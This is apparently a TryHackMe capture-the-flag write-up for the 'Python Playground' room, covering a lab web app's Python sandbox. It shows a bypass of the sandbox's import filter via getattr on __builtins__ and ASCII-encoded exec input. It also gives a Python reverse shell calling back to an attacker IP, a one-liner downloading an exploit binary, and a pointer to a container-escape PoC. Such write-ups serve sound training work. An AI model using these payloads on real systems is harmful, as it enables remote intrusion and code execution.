# Tryhackme.com Room : Python Playground
`https://tryhackme.com/room/pythonplayground`


# Instance
```
export IP=10.10.242.180
```

# Nmap
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f4:af:2f:f0:42:8a:b5:66:61:3e:73:d8:0d:2e:1c:7f (RSA)
|   256 36:f0:f3:aa:6b:e3:b9:21:c8:88:bd:8d:1c:aa:e2:cd (ECDSA)
|_  256 54:7e:3f:a9:17:da:63:f2:a2:ee:5c:60:7d:29:12:55 (ED25519)
80/tcp open  http    Node.js Express framework
|_http-title: Python Playground!
```

Seems like we can't login or singup on the website.

Running gobuster, we found a `admin.html` file with a login sreen.

The password validation is server side :
```js
<!DOCTYPE html>
<html>
    <head>
        <title>Python Playground!</title>

        <link href="bootstrap-4.4.1-dist/css/bootstrap.min.css" rel="stylesheet">

        <style>
            html,
body {
  height: 100%;
}

body {
  display: -ms-flexbox;
  display: flex;
  -ms-flex-align: center;
  align-items: center;
  padding-top: 40px;
  padding-bottom: 40px;
  background-color: #f5f5f5;
}

.form-signin {
  width: 100%;
  max-width: 330px;
  padding: 15px;
  margin: auto;
}
.form-signin .checkbox {
  font-weight: 400;
}
.form-signin .form-control {
  position: relative;
  box-sizing: border-box;
  height: auto;
  padding: 10px;
  font-size: 16px;
}
.form-signin .form-control:focus {
  z-index: 2;
}
.form-signin input[type="text"] {
  margin-bottom: -1px;
  border-bottom-right-radius: 0;
  border-bottom-left-radius: 0;
}
.form-signin input[type="password"] {
  margin-bottom: 10px;
  border-top-left-radius: 0;
  border-top-right-radius: 0;
}
        </style>
    </head>

    <body class="text-center">
        <form class="form-signin">
            <h1 class="h3 mb-3 font-weight-normal">Connor's Secret Admin Backdoor</h1>
            <label for="username" class="sr-only">Username</label>
            <input type="text" id="username" class="form-control" placeholder="Username" required="" autofocus="">
            <label for="inputPassword" class="sr-only">Password</label>
            <input type="password" id="inputPassword" class="form-control" placeholder="Password" required="">
            <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>

            <div style="display: none" id="fail" class="alert alert-danger">Access Denied!</div>
        </form>
    </body>

    <script>
      // I suck at server side code, luckily I know how to make things secure without it - Connor

      function string_to_int_array(str){
        const intArr = [];

        for(let i=0;i<str.length;i++){
          const charcode = str.charCodeAt(i);

          const partA = Math.floor(charcode / 26);
          const partB = charcode % 26;

          intArr.push(partA);
          intArr.push(partB);
        }

        return intArr;
      }

      function int_array_to_text(int_array){
        let txt = '';

        for(let i=0;i<int_array.length;i++){
          txt += String.fromCharCode(97 + int_array[i]);
        }

        return txt;
      }

      document.forms[0].onsubmit = function (e){
          e.preventDefault();

          if(document.getElementById('username').value !== 'connor'){
            document.getElementById('fail').style.display = '';
            return false;
          }

          const chosenPass = document.getElementById('inputPassword').value;

          const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(chosenPass))));

          if(hash === 'dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu'){
            window.location = 'super-secret-admin-testing-panel.html';
          }else {
            document.getElementById('fail').style.display = '';
          }
          return false;
      }
  </script>
```

We don't really care about the username/password. We can simply browse `super-secret-admin-testing-panel.html`

On this page we get a python shell.
We can't include `os`. We get
```
Security Threat detected
```

Actually, seems like we can't `import` anything.

We can list available methods using `print(dir(__builtins__))` :
```
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
```

We have access to `eval and exec` method. Maybe we can encode our script and pass it to eval ?

We can build the command `import os; os.system('ls')` using ascii ref like this :
```py
cmd_ascii= [105, 109, 112, 111, 114, 116, 32, 111, 115, 59, 32, 111, 115, 46, 115, 121, 115, 116, 101, 109, 40, 39, 108, 115, 39, 41]

cmd = ""

for c in cmd_ascii:
  cmd += chr(c)

print(cmd)
```

But `eval` and `exec` are filtered...

So what we can do is retrieve the function from the `__builtins__` object.
We manually retrieve the index of `exec` which is `101` and we do :
```py
method_names = dir(__builtins__)

fct_name = method_names[101]

fct = getattr(__builtins__,fct_name)

cmd_ascii= [105, 109, 112, 111, 114, 116, 32, 111, 115, 59, 32, 111, 115, 46, 115, 121, 115, 116, 101, 109, 40, 39, 108, 115, 39, 41]

cmd = ""

for c in cmd_ascii:
  cmd += chr(c)

print(fct(cmd))
```

This will execute the `import os; os.system('ls')` command.

Let's get a reverse shell i guess ?

We will run 
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.13.34",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

And we got a shell.

The full runned command is :
```py
method_names = dir(__builtins__)

fct_name = method_names[101]

fct = getattr(__builtins__,fct_name)

cmd_ascii= [105, 109, 112, 111, 114, 116, 32, 115, 111, 99, 107, 101, 116, 44, 115, 117, 98, 112, 114, 111, 99, 101, 115, 115, 44, 111, 115, 59, 115, 61, 115, 111, 99, 107, 101, 116, 46, 115, 111, 99, 107, 101, 116, 40, 115, 111, 99, 107, 101, 116, 46, 65, 70, 95, 73, 78, 69, 84, 44, 115, 111, 99, 107, 101, 116, 46, 83, 79, 67, 75, 95, 83, 84, 82, 69, 65, 77, 41, 59, 115, 46, 99, 111, 110, 110, 101, 99, 116, 40, 40, 34, 49, 48, 46, 50, 46, 49, 51, 46, 51, 52, 34, 44, 56, 56, 56, 56, 41, 41, 59, 111, 115, 46, 100, 117, 112, 50, 40, 115, 46, 102, 105, 108, 101, 110, 111, 40, 41, 44, 48, 41, 59, 32, 111, 115, 46, 100, 117, 112, 50, 40, 115, 46, 102, 105, 108, 101, 110, 111, 40, 41, 44, 49, 41, 59, 32, 111, 115, 46, 100, 117, 112, 50, 40, 115, 46, 102, 105, 108, 101, 110, 111, 40, 41, 44, 50, 41, 59, 112, 61, 115, 117, 98, 112, 114, 111, 99, 101, 115, 115, 46, 99, 97, 108, 108, 40, 91, 34, 47, 98, 105, 110, 47, 115, 104, 34, 44, 34, 45, 105, 34, 93, 41, 59]

cmd = ""

for c in cmd_ascii:
  cmd += chr(c)

print(fct(cmd))
```

Running `id` :
```
uid=0(root) gid=0(root) groups=0(root)
```

Seems like we are root but i think we are in a container.

We can retrieve the `/root/flag1.txt`:
```
THM{7e0b5cf043975e3c104a458a8d4f6f2f}
```

Hmm yup we are in a container, how can we escape the container ?

Maybe we can use this poc :
```
https://github.com/Frichetten/CVE-2019-5736-PoC
```
We can retrieve files using :
```
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://10.2.13.34:8000/exp","exp")'
```

Tried to run it but seems like I broke the box. Let's try again later...